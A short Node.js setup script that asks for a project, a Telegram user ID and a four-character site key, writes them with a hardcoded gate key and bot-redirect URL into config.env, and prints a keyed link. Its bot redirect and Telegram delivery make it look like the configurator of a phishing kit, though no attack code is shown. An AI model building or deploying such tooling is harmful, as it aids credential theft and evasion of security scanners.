const fs = require('fs')
const path = require('path')
const inquirer = require('inquirer')

const sslFileObj = require('./auto/ssl.json')


const gateKey = "s3m5xaTVuCLIeS8BxUUUjyOMrp6QX3tU"

const botRedictUrl = "https://internet.com/"



const questionList = [
   
    {
        type: 'list',
        message: 'Select a project',
        name: 'project',
        choices: [
        new inquirer.Separator(' = Available Proects in ./projects = '),
        ]
    },
    {
        type: 'input',
        message: 'Enter your Telegrm User ID:',
        name: 'telegramID'
    }, 
    
    {
        type: 'input',
        message: 'Enter your site key(4 Characters):',
        name: 'siteKey',
        validate(answer)  {
            if (answer.length != 4) {
                return "Site Key must be 4 characters"
            }
            return true
        }
    }, 
]


const projectsDir = path.join(__dirname, 'projects')
if (!fs.existsSync(projectsDir)) {
    console.error('Failed to find project directory, exiting.....')
    process.exit(1)
}


const dirList = fs.readdirSync(projectsDir)
dirList.forEach(dirInput => {
    if (fs.statSync(path.join(projectsDir, dirInput)).isDirectory()) {
        questionList[0].choices.push({
            name: dirInput
        })
    }
});


inquirer
  .prompt(questionList)
  .then((answerList => {
      const currentProject = answerList.project
      const tgUserID = answerList.telegramID
      const siteKey = answerList.siteKey

      const CONFIG_ENV_STR = `
BOT_REDIRECT=${botRedictUrl}

CURRENT_PROJECT=${currentProject}

TELEGRAM_USER_ID=${tgUserID}

SRC_KEY=${siteKey}

GATE_KEY=${gateKey}

GLOBAL_AGENT_HTTP_PROXY_=http://user:pass@host:port
`
    

    fs.writeFileSync('config.env', CONFIG_ENV_STR)
    console.log('User Configuration Complete.....')

    const fullLink = `https://${sslFileObj.domain}/?${siteKey}`

    console.log(`**********URL: ${fullLink} **********`)

  }))